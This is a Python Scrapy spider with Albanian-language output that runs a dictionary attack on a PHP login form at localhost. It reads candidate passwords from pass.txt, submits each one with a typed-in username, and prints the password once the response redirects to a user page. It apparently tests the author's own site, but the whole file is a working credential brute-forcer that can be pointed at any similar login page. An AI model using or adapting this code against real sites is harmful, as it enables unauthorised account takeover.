import scrapy
import sys

class DictSpider(scrapy.Spider):
    name = 'dict'
    allowed_domains = ['google.com']
    start_urls = ['http://localhost:1234/activebody_final3/ballina.php']

    def __init__(self):
        self.search = [str(x).strip() for x in open('pass.txt', 'rt')]
        super().__init__()


    def parse(self, response):
        print('Jepeni username: ')
        x = input()
        for search in self.search:
            print('Testimi i Passwordit "{}"'.format(search))
            yield scrapy.FormRequest(
                url='http://localhost:1234/activebody_final3/ballina.php',
                formdata={
                    'username': '{}'.format(x),
                    'password': '{}'.format(search),
                    'submit': 'Kyqu'
                },
                meta={
                    'x':x,
                    'search':search
                },
                dont_filter=True,
                callback=self.getPageSearch
            )

    def getPageSearch(self,response):
        x = response.meta['x']
        search = response.meta['search']
        if 'Perdoruesi ose fjalekalimi eshte gabim!' in response.text:
            print('"{}" nuk eshte fjalekalim'.format(search))
        if 'index_Perdoruesit.php' in response.url:
            print('Fjalekalimi per userin: "{}" eshte "{}"'.format(x,search))
            # breakpoint()

        # print('s')
